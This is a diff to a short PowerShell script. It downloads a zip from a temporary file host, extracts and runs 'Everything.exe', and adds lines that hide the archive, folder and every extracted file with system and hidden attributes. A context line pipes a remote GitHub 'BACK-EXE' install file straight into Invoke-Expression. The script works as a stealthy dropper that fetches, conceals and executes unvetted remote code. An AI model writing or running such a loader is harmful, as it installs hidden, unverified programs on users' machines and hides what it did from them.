@@ -1,12 +1,16 @@
-$zipUrl = "https://example.com/arquivo.zip"
-$exeName = "programa.exe"
+$zipUrl = "https://tmpfiles.org/dl/17224664/everything.zip"
+$exeName = "Everything.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "arquivo.zip"
-$extractFolder = Join-Path $tempFolder "extraido"
+$zipFile = Join-Path $tempFolder "Everything.zip"
+$extractFolder = Join-Path $tempFolder "Everything"
 $exePath = Join-Path $extractFolder $exeName
 
-if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile }
-if (-Not (Test-Path $extractFolder)) { Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force }
+if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile; & attrib +h +s $zipFile }
+if (-Not (Test-Path $extractFolder)) { Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force; & attrib +h +s $extractFolder }
+
+$files = Get-ChildItem -Path $extractFolder -Recurse -File
+foreach ($file in $files) { & attrib +h +s $file.FullName }
+
 if (Test-Path $exePath) { Start-Process -FilePath $exePath }
 
 iwr -useb https://raw.githubusercontent.com/theuwpk/BACK-EXE/refs/heads/main/MAIN/INSTALL.TXT | iex
